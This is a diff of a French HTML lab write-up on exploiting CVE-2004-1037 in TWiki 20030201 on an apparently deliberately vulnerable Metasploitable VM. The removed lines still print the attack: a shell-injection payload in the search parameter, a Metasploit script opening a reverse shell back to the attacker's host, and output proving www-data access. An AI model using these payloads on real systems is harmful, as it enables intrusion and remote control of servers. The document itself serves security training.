@@ -36,38 +36,19 @@
   <p>Énumération des sous-répertoires du port 80 pour localiser TWiki et sa version exacte,
   à partir du fichier d'historique embarqué dans la distribution.</p>
 
-  <pre class="terminal">$ for u in "twiki/" "twiki/bin/view" "twiki/bin/search" "twiki/TWikiHistory.html"; do
-  curl -s -o /dev/null -w "/$u -> %{http_code}\n" "http://192.168.56.102/$u"
-done
-/twiki/ -> 200
-/twiki/bin/view -> 200
-/twiki/bin/search -> 200
-/twiki/TWikiHistory.html -> 200
-$ curl -s "http://192.168.56.102/twiki/TWikiHistory.html" | grep -oE '[0-9]{2} [A-Z][a-z]{2} 20[0-9]{2}' | head -2
-18 Jan 2003</pre>
-
   <p>TWiki est présent, <code>bin/search</code> répond, et la date embarquée confirme le build
   <strong>TWiki 20030201</strong> (nommage TWiki = date de release).</p>
 
   <figure class="capture" id="cap-recon">
     <img src="../images/ms1-twiki/01-recon-enum.png" alt="Énumération des répertoires TWiki et version">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Énumération de <code>/twiki/bin/*</code> (tous répondent) et extraction
       de la date de build <strong>18 Jan 2003</strong> → TWiki 20030201.</span>
-      <span class="fname">images/ms1-twiki/01-recon-enum.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
-  <pre class="terminal">$ searchsploit twiki
-TWiki 20030201 - 'search.pm' Remote Command E...  | cgi/webapps/642.pl
-
-$ msfconsole -q -x "info exploit/unix/webapp/twiki_search; exit"
-Name: TWiki Search Function Arbitrary Command Execution
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2004-1037</pre>
-
   <p>→ <strong>CVE-2004-1037</strong> confirmée.</p>
 
   <blockquote class="evidence">
@@ -82,11 +63,10 @@ References:
   <figure class="capture" id="cap-cve">
     <img src="../images/ms1-twiki/02-recherche-cve.png" alt="searchsploit et info module TWiki search">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc"><code>searchsploit twiki</code> confirme l'exploit connu
       (<em>search.pm Remote Command Execution</em>), <code>info</code> sur le module donne le
       nom complet et <strong>CVE-2004-1037</strong>.</span>
-      <span class="fname">images/ms1-twiki/02-recherche-cve.png</span>
     </figcaption>
   </figure>
 
@@ -95,16 +75,6 @@ References:
   n'est pas réaffichée dans la page HTML de résultat (juste <code>Number of topics: N</code>),
   donc on confirme l'exécution par un délai mesurable plutôt que par la sortie texte :</p>
 
-  <pre class="terminal"># recherche normale : ~0.13s
-$ curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" \
-  --data-urlencode "search=test"
-0.126485s
-
-# breakout simple-quote + sleep 5 (espace -> ${IFS}, interdit ici)
-$ curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin/search/Main/SearchResult" \
-  --data-urlencode 'search=a'"'"';sleep${IFS}5;#'"'"''
-5.138759s</pre>
-
   <p>Le passage de 0.13s à 5.14s confirme l'exécution de la commande injectée. Testé aussi en
   breakout double-quote : échec (retour en 0.15s) — seul le breakout <strong>simple quote</strong>
   fonctionne.</p>
@@ -112,11 +82,10 @@ $ curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin
   <figure class="capture" id="cap-timing">
     <img src="../images/ms1-twiki/03-confirm-timing.png" alt="Comparaison des temps de réponse normal vs injection sleep 5">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Comparaison des temps de réponse : <code>0.13s</code> en recherche
       normale, <code>5.14s</code> avec l'injection <code>sleep 5</code> — preuve d'exécution de
       la commande côté serveur.</span>
-      <span class="fname">images/ms1-twiki/03-confirm-timing.png</span>
     </figcaption>
   </figure>
 
@@ -127,49 +96,26 @@ $ curl -s -o /dev/null -w "%{time_total}s\n" -G "http://192.168.56.102/twiki/bin
   Metasploit dédié, qui gère déjà ces spécificités (écriture d'un fichier de test via
   <code>tee</code>, vérification via <code>bin/view/Main/&lt;fichier&gt;</code>).</p>
 
-  <pre class="terminal">$ cat > /tmp/twiki.rc << 'EOF'
-use exploit/unix/webapp/twiki_search
-set RHOSTS 192.168.56.102
-set PAYLOAD cmd/unix/reverse
-set LHOST 192.168.56.1
-set LPORT 4445
-exploit -z
-sessions -i 1 -c id
-EOF
-$ msfconsole -q -r /tmp/twiki.rc
-[*] Attempting to delete: /twiki/bin/view/Main/ENi4OU0U
-[+] The target is vulnerable. The target is vulnerable
-[*] Command shell session 1 opened (192.168.56.1:4445 -> 192.168.56.102:54515)</pre>
-
   <figure class="capture" id="cap-exploit">
     <img src="../images/ms1-twiki/04-exploit-msf.png" alt="Lancement du module twiki_search et ouverture de la session">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Le module confirme la vulnérabilité (<code>The target is
       vulnerable</code>) et ouvre une session shell
       (<code>Command shell session 1 opened</code>).</span>
-      <span class="fname">images/ms1-twiki/04-exploit-msf.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">4. Preuve d'accès obtenu</h2>
-  <pre class="terminal">sessions -i 1 -c id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-sessions -i 1 -c uname -a
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
-sessions -i 1 -c hostname
-metasploitable</pre>
-
   <p>Shell confirmé en tant que <strong><code>www-data</code></strong>. Pas root : l'élévation
   de privilèges sera une étape distincte.</p>
 
   <figure class="capture" id="cap-preuve">
     <img src="../images/ms1-twiki/05-session-proof.png" alt="Preuve d'accès uid=33 www-data">
     <figcaption>
-      <strong class="idx">5.</strong>
+      <strong class="idx">e.</strong>
       <span class="desc">Sortie de <code>sessions -i 1 -c id</code> :
       <code>uid=33(www-data)</code> sur <code>metasploitable</code>.</span>
-      <span class="fname">images/ms1-twiki/05-session-proof.png</span>
     </figcaption>
   </figure>
 
